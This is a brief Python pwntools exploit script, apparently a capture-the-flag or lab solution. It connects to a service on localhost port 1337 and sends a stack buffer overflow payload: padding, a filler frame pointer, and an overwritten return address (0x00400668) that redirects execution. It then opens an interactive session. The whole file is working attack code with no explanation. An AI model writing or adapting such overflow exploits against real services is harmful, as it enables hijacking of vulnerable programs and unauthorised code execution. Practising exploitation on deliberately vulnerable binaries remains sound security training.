from pwn import *

p = remote("localhost", 1337)

print(p.read().decode())

payload = b'A'*64 + b'B'*8 + p64(0x00400668)
p.send(payload)
print(p.read().decode())

p.interactive()

p.close()